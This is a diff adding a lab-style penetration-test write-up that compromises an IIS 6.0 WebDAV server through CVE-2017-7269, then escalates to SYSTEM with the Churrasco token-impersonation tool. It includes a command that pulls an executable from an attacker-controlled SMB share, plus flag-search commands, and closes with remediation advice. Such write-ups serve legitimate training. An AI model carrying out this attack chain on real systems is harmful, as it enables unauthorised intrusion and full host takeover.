@@ -98,4 +98,121 @@ IIS 6.0 combined with directory behavior indicated potential for **WebDAV exploi
 
 ## 6. Exploitation
 
-###
+### 6.1 Attempted WebDAV Upload Techniques
+
+Initial attempts involved testing Exploit-DB scripts:
+
+- EDB 8765
+- EDB 8806
+
+These attempts were partially successful but did not yield a stable foothold.
+
+### 6.2 Successful Exploit: CVE-2017-7269 (IIS 6.0 PROPFIND RCE)
+
+A publicly documented PoC for **CVE-2017-7269** was used to deliver a reverse shell to the attacker host.
+
+Upon exploitation, a reverse shell as `nt authority\network service` was obtained.
+
+---
+
+## 7. Post-Exploitation Enumeration
+
+### 7.1 System Identification
+
+`systeminfo` revealed the host OS as:
+
+- **Windows Server 2003 SP2** (x86)
+
+### 7.2 Privilege Review
+
+`whoami /priv` showed:
+
+- **SeImpersonatePrivilege: Enabled**
+
+This token typically allows token impersonation-based privilege escalation pathways.
+
+---
+
+## 8. Privilege Escalation
+
+### 8.1 Initial Attempts
+
+Multiple transfer methods were tested including `certutil` and `bitsadmin`, but none succeeded due to OS age and missing components.
+
+SMB file transfer via Impacket **smbserver.py** was ultimately successful. Files transferred using:
+
+```
+copy \\10.10.14.8\sharename\file.exe
+```
+
+Unfortunately, PrintSpoofer, an exploit typically successful in **SeImpersonatePrivilege** vulnerabilities did not work on this machine.
+
+---
+
+### 8.2 Working Escalation: Churrasco
+
+The Churrasco executable (compatible with Server 2003 SeImpersonatePrivilege-based escalation) was uploaded and executed.
+
+Upgraded privileges of `nt authority\system` represented full host compromise.
+
+---
+
+## 9. Proof of Access
+
+Located user and root flags using a recursive search:
+
+```
+dir C:\ /s /b | findstr /i user.txt
+
+dir C:\ /s /b | findstr /i root.txt
+```
+
+### 9.1 User Flag
+
+Location:
+
+```
+C:\Documents and Settings\Harry\Desktop\user.txt
+```
+
+Value: *REDACTED*
+
+### 9.2 Root Flag
+
+```
+C:\Documents and Settings\Administrator\Desktop\root.txt
+```
+
+Value: *REDACTED*
+
+---
+
+## 10. Recommendations
+
+### 1. Decommission or Upgrade IIS 6.0
+
+IIS 6.0 (2003) is end-of-life and contains multiple unpatched RCE vulnerabilities.
+
+### 2. Disable or Restrict WebDAV
+
+If WebDAV is not required, disable it entirely.
+
+### Restrict SeImpersonatePrivilege
+
+This privilege allows significant escalation paths. Ensure only trusted services possess it.
+
+### Apply Strong File Transfer Controls
+
+Legacy hosts lack secure utilities. Modernizing host and enabling PowerShell or secure transfer mechanisms is recommended.
+
+### Implement Network Segmentation
+
+Legacy systems should be placed in isolated VLANs away from critical assets.
+
+---
+
+## 11. Conclusion
+
+The engagement resulted in full compromise of the target machine. Vulnerabilities in outdated IIS WebDAV components (CVE-2017-7269) combined with dangerous local privileges (SeImpersonatePrivilege) enabled remote code execution and complete administrative takeover.
+
+The existence of these critical issues indicates a high-risk environment requiring immediate remediation.
